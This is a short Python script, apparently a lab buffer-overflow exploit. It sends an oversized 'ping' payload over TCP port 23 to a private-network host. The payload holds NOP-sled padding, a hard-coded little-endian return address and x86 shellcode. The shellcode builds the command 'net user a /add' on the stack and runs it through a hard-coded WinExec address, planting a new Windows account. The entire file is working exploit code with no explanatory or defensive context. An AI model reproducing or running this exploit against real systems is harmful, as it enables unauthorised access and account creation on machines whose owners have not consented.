import socket

shellcode = b'\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x0C\xC6\x45\xF0\x6E\xC6\x45\xF1\x65\xC6\x45\xF2\x74\xC6\x45\xF3\x20\xC6\x45\xF4\x75\xC6\x45\xF5\x73\xC6\x45\xF6\x65\xC6\x45\xF7\x72\xC6\x45\xF8\x20\xC6\x45\xF9\x61\xC6\x45\xFA\x20\xC6\x45\xFB\x2F\xC6\x45\xFC\x61\xC6\x45\xFD\x64\xC6\x45\xFE\x64\x8D\x45\xF0\x50\xB8\xC7\x93\xBF\x77\xFF\xD0'

def send(code,host='192.168.85.139',port=23):
 with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
  sock.connect((host,port))
  data = b'ping ' + code + b'\r\n'
  sock.send(data)
  sock.recv(1000)
RET_addr = bytes.fromhex('7ffa4512')[::-1]
attackcode = ((b"\x90" *4 + shellcode).ljust(1012,b"\x90") + RET_addr).ljust(2000,b"\x90")
send(attackcode)
